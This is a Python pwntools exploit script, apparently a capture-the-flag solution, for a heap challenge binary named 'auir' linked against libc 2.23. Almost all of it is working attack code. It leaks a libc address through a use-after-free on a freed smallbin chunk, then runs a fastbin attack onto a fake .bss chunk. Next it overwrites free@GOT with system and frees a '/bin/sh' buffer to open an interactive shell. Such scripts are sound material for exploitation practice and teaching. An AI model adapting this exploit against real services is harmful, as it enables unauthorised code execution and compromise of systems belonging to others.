from pwn import *

e = ELF("./auir")
libc = ELF("./libc-2.23.so")

context.log_level = "debug"
context.terminal =["tmux", "split", "-h"]
context.binary = e.path

is_remote = "--remote" in sys.argv

if is_remote:
  r = remote("", 1234)
else:
  env = {"LD_PRELOAD": libc.path}
  r = process(e.path, env=env)

def debug():
  if not is_remote:
      gdb.attach(r)

zealot_idx = 0

def make_zealot(size, skills):
  global zealot_idx
  r.sendline("1")
  r.recvuntil(">>")
  size_str = str(int(size))
  r.sendline(size_str)
  r.recvuntil(">>")
  r.sendline(skills)
  r.recv()
  zealot_idx += 1
  return str(zealot_idx - 1)

def delete_zealot(idx):
  global zealot_idx
  r.sendline("2")
  r.recv()
  r.sendline(idx)
  r.recv()

def fix_zealot(idx, size, skills):
  r.sendline("3")
  r.recv()
  r.sendline(idx)
  r.recv()
  size_str = str(int(size))
  r.sendline(size_str)
  r.recv()
  r.sendline(skills)
  r.recv()

def display_skills(idx): 
  r.sendline("4")
  r.recv()
  r.sendline(idx)
  resp = r.recv()
  return resp.split("\n")[1].split("|")[0]

debug()

r.recv()

# leak libc by freeing into smallbin and read bk ptr
a = make_zealot(0xa0, "AAAA")
b = make_zealot(0x10, "BBBB") # prevent consolidation
delete_zealot(a)

# leak heap ptr via UAF on a
main_arena = u64(display_skills(a).rstrip().ljust(8, "\x00"))
print("[*] Main arena leak: " + str(hex(main_arena)))

libc.address = main_arena - 0x3c4b78
print("[*] Libc leak: " + str(hex(libc.address)))

malloc_hook = libc.symbols["__malloc_hook"]
print("[*] __malloc_hook address: " + str(hex(malloc_hook)))

# fastbin attack to get arbitrary write
# put into 0x60 fastbin because of malloc hook fake chunk
c = make_zealot(0x60, "CCCC")
d = make_zealot(0x60, "DDDD") # prevent consolidation

delete_zealot(c)

# set fake chunk to be .bss and modify heap ptr
bss_addr = 0x605310
fix_zealot(c, 0x60, p64(bss_addr - 0x23)) # find 0x7f in memory to bypass check


e_var = make_zealot(0x60, "AAAA") # alloc first chunk and point allocator to fake chunk

# put free@GOT address into heap ptr table
free_got = e.got["free"]
print(str(hex(free_got)))
f = make_zealot(0x60, "\x00" * (0x23-0x10) + p64(free_got)) 

# edit free@GOT to be system
system = libc.sym["system"]
fix_zealot("0", 0x8, p64(system))

# create new zealot with /bin/sh\x00 as skill and use free() as system
g = make_zealot(0x10, "/bin/sh\x00")
delete_zealot(g)

r.interactive()
